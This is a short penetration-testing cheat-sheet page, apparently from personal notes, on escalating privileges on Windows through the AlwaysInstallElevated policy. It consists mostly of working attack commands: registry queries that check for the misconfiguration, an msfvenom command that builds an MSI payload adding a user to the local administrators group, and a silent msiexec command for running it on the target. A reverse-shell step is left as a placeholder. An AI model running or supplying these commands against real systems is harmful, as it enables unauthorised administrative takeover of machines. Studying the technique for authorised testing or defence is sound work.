---
title: always install elevated
category: win privesc
order: 1
---

[_WPE-09 - Always Install Elevated](https://pentestlab.blog/2017/02/28/always-install-elevated/)

Windows environments provide a group policy setting which allows a regular user to install a Microsoft Windows Installer Package (MSI) with system privileges

## | 1 verify
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## | 2 Generate payload on attacking machine:
```
msfvenom -p windows/exec CMD='net localgroup administrators minilow /add' -f msi-nouac -o setup.msi
```
## | 3 Run it on the target machine:
```
msiexec /quiet /qn /i C:\Temp\setup.msi
```

## | 4 Reverse shell con system ya en el msi
TODO
